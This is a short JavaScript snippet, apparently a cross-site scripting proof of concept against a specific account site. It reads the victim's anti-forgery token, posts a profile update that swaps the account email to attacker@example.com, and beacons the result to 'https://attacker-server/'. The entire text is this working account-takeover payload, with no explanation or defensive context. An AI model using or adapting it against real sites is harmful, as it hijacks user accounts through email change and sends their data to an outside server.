// Get CSRF token
fetch('my.skyup.sky/Account/MyAccount', {
  credentials: 'include'
}).then(r => r.text()).then(html => {
  // Extract token
  var parser = new DOMParser();
  var doc = parser.parseFromString(html, 'text/html');
  var token = doc.querySelector('input[name="__RequestVerificationToken"]').value;

  // Change email
  var formData = new FormData();
  formData.append('__RequestVerificationToken', token);
  formData.append('Title', 'Mr');
  formData.append('FirstName', 'attacker2');
  formData.append('LastName', 'Change2');
  formData.append('Telephone', '9999999999');
  formData.append('EmailAddress', 'attacker@example.com');
  formData.append('ConfirmEmailAddress', 'attacker@example.com');
  formData.append('MainPosition', 'Headteacher');
  formData.append('CurrentSchool', 'Abbey College');
  formData.append('PostcodeLookupInput', '');

  return fetch('my.skyup.sky/Handlers/UpdateDetails', {
    method: 'POST',
    credentials: 'include',
    body: formData
  });
}).then(r => r.text()).then(result => {
  // Notify attacker server
  new Image().src = 'https://attacker-server/?email_changed=' + encodeURIComponent(result);
});
